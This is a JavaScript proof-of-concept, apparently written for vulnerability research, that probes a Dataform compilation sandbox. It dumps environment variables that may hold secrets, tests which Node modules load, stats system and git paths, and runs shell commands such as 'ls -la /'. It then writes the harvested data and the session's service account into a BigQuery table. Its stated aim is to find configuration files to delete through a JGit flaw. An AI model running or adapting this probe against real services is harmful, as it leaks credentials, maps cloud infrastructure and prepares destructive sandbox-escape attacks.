/**
 * Sandbox Discovery Probe
 *
 * Purpose: Identify the sandbox mechanism and find configuration files
 * that could be targeted for deletion via JGit vulnerability
 *
 * Key questions:
 * 1. What sandbox is being used? (gVisor, seccomp, container, etc.)
 * 2. What's the worktree path for git operations?
 * 3. What configuration files exist that control isolation?
 * 4. What temp/cache paths are shared between compilations?
 */

const probeTimestamp = Date.now();
const probeId = `sandbox_probe_${probeTimestamp}`;

const results = {
  probeId: probeId,
  timestamp: new Date().toISOString(),
  environment: {},
  sandbox: {},
  paths: {},
  modules: {},
  process: {}
};

// ============================================
// TEST 1: Process Environment Analysis
// ============================================
try {
  if (typeof process !== "undefined") {
    // Get all environment variables (these often reveal infrastructure)
    const env = process.env || {};
    const envKeys = Object.keys(env);

    // Look for sandbox/container indicators
    const interestingKeys = envKeys.filter(k =>
      k.includes("SANDBOX") || k.includes("GVISOR") || k.includes("CONTAINER") ||
      k.includes("DOCKER") || k.includes("K8S") || k.includes("KUBE") ||
      k.includes("GCP") || k.includes("GOOGLE") || k.includes("CLOUD") ||
      k.includes("DATAFORM") || k.includes("GIT") || k.includes("PATH") ||
      k.includes("HOME") || k.includes("USER") || k.includes("PWD") ||
      k.includes("TEMP") || k.includes("TMP") || k.includes("CACHE") ||
      k.includes("NODE") || k.includes("NPM") || k.includes("V8")
    );

    const envValues = {};
    interestingKeys.forEach(k => {
      envValues[k] = String(env[k]).substring(0, 500);
    });

    results.environment = {
      totalEnvVars: envKeys.length,
      allKeys: envKeys,
      interestingVars: envValues,
      pwd: env.PWD || "N/A",
      home: env.HOME || "N/A",
      user: env.USER || "N/A",
      tmpdir: env.TMPDIR || env.TMP || env.TEMP || "N/A"
    };

    // Process info
    results.process = {
      pid: process.pid,
      ppid: process.ppid,
      uid: typeof process.getuid === "function" ? process.getuid() : "N/A",
      gid: typeof process.getgid === "function" ? process.getgid() : "N/A",
      cwd: typeof process.cwd === "function" ? process.cwd() : "N/A",
      platform: process.platform,
      arch: process.arch,
      version: process.version,
      versions: process.versions,
      execPath: process.execPath,
      argv: process.argv,
      title: process.title
    };
  }
} catch (e) {
  results.environment.error = e.message;
}

// ============================================
// TEST 2: Module Loading Capabilities
// ============================================
try {
  const moduleTests = {};

  // Test which modules can be loaded
  const testModules = [
    "fs", "path", "os", "child_process", "net", "http", "https",
    "crypto", "vm", "cluster", "dgram", "dns", "readline", "tty",
    "v8", "process", "buffer", "events", "stream", "util"
  ];

  for (const modName of testModules) {
    try {
      const mod = require(modName);
      moduleTests[modName] = {
        loaded: true,
        type: typeof mod,
        keys: Object.keys(mod).slice(0, 20)
      };
    } catch (e) {
      moduleTests[modName] = {
        loaded: false,
        error: e.message
      };
    }
  }

  results.modules = moduleTests;
} catch (e) {
  results.modules.error = e.message;
}

// ============================================
// TEST 3: Sandbox Detection via Process Info
// ============================================
try {
  const sandboxIndicators = [];

  // Check for gVisor
  if (typeof process !== "undefined") {
    // gVisor often shows specific platform or version strings
    if (process.platform === "linux" && process.versions) {
      sandboxIndicators.push({
        check: "process.versions",
        value: process.versions
      });
    }
  }

  // Check for container indicators in env
  if (typeof process !== "undefined" && process.env) {
    if (process.env.KUBERNETES_SERVICE_HOST) {
      sandboxIndicators.push({ check: "kubernetes", detected: true });
    }
    if (process.env.container || process.env.CONTAINER) {
      sandboxIndicators.push({ check: "container_env", detected: true });
    }
  }

  // Try to detect via module behavior
  try {
    const path = require("path");
    sandboxIndicators.push({
      check: "path_module",
      sep: path.sep,
      delimiter: path.delimiter
    });
  } catch (e) {
    sandboxIndicators.push({ check: "path_module", error: e.message });
  }

  results.sandbox = {
    indicators: sandboxIndicators
  };
} catch (e) {
  results.sandbox.error = e.message;
}

// ============================================
// TEST 4: Path Resolution Analysis
// ============================================
try {
  // These paths would be interesting targets for JGit file deletion
  const pathsToProbe = [
    // Standard locations
    "/", "/etc", "/tmp", "/var", "/home", "/root",
    // Potential Dataform paths
    "/dataform", "/opt/dataform", "/var/lib/dataform",
    "/etc/dataform", "/run/dataform",
    // Container/sandbox paths
    "/proc/self", "/sys/fs/cgroup",
    // Cache locations
    "/var/cache", "/var/cache/dataform",
    // Node paths
    "/usr/local/lib/node_modules",
    // Git paths
    "/.git", ".git", "../.git", "../../.git"
  ];

  results.paths = {
    probed: pathsToProbe,
    cwd: typeof process !== "undefined" && process.cwd ? process.cwd() : "unknown",
    dirname: typeof __dirname !== "undefined" ? __dirname : "unknown",
    filename: typeof __filename !== "undefined" ? __filename : "unknown"
  };

  // If we have path module, try to resolve some paths
  try {
    const path = require("path");
    results.paths.resolved = {
      cwdResolved: path.resolve("."),
      parentResolved: path.resolve(".."),
      grandparentResolved: path.resolve("../.."),
      rootResolved: path.resolve("/")
    };
  } catch (e) {
    results.paths.pathModuleError = e.message;
  }

  // If we have fs, try to check paths
  try {
    const fs = require("fs");
    const accessResults = {};
    for (const p of pathsToProbe.slice(0, 10)) {
      try {
        const stat = fs.statSync(p);
        accessResults[p] = {
          exists: true,
          isDir: stat.isDirectory(),
          isFile: stat.isFile(),
          mode: stat.mode.toString(8),
          uid: stat.uid,
          gid: stat.gid
        };
      } catch (e) {
        accessResults[p] = { exists: false, error: e.code };
      }
    }
    results.paths.access = accessResults;
  } catch (e) {
    results.paths.fsError = e.message;
  }
} catch (e) {
  results.paths.error = e.message;
}

// ============================================
// TEST 5: Git/JGit Related Discovery
// ============================================
try {
  results.git = {};

  // Check if git-related env vars exist
  if (typeof process !== "undefined" && process.env) {
    const gitEnvVars = {};
    for (const key of Object.keys(process.env)) {
      if (key.includes("GIT")) {
        gitEnvVars[key] = process.env[key];
      }
    }
    results.git.envVars = gitEnvVars;
  }

  // Check module paths for any git-related modules
  if (typeof module !== "undefined" && module.paths) {
    results.git.modulePaths = module.paths;
  }

  // Try to detect .git directory location
  try {
    const path = require("path");
    results.git.potentialGitDirs = [
      path.resolve(".git"),
      path.resolve("../.git"),
      path.resolve("../../.git")
    ];
  } catch (e) {
    // path module not available
  }
} catch (e) {
  results.git.error = e.message;
}

// ============================================
// TEST 6: Attempt Shell Access (for git)
// ============================================
try {
  results.shell = { available: false };

  const cp = require("child_process");

  // If we get here, child_process loaded!
  results.shell.available = true;
  results.shell.cpKeys = Object.keys(cp);

  // Try to run git
  try {
    const gitVersion = cp.execSync("git --version", {
      encoding: "utf8",
      timeout: 5000
    });
    results.shell.gitVersion = gitVersion.trim();
    results.shell.gitAvailable = true;

    // Try to get more git info
    try {
      const gitStatus = cp.execSync("git status 2>&1 || true", {
        encoding: "utf8",
        timeout: 5000
      });
      results.shell.gitStatus = gitStatus.substring(0, 500);
    } catch (e) {
      results.shell.gitStatusError = e.message;
    }

    try {
      const pwd = cp.execSync("pwd", { encoding: "utf8" });
      results.shell.pwd = pwd.trim();
    } catch (e) {}

    try {
      const ls = cp.execSync("ls -la / 2>&1 | head -20", { encoding: "utf8" });
      results.shell.rootLs = ls;
    } catch (e) {}

  } catch (e) {
    results.shell.gitError = e.message;
    results.shell.gitAvailable = false;
  }

} catch (e) {
  results.shell.loadError = e.message;
}

// ============================================
// Create Dataform Action with Results
// ============================================

// Configure dataform
dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

// Store results
operate("sandbox_discovery_results").queries([
  `-- Sandbox Discovery Results - ${probeId}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.sandbox_discovery\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     SESSION_USER() as service_account,
     '''${JSON.stringify(results, null, 2).replace(/'/g, "\\'")}''' as results_json`
]);

// Create a summary view
publish("sandbox_discovery_summary").query(`
  SELECT
    '${probeId}' as probe_id,
    '${results.process.cwd || "unknown"}' as working_directory,
    ${results.shell?.available || false} as shell_available,
    ${results.shell?.gitAvailable || false} as git_available,
    '${results.shell?.gitVersion?.replace(/'/g, "") || "N/A"}' as git_version,
    '${results.process.platform || "unknown"}' as platform,
    '${Object.keys(results.modules || {}).filter(m => results.modules[m]?.loaded).join(",")}' as loaded_modules
`);
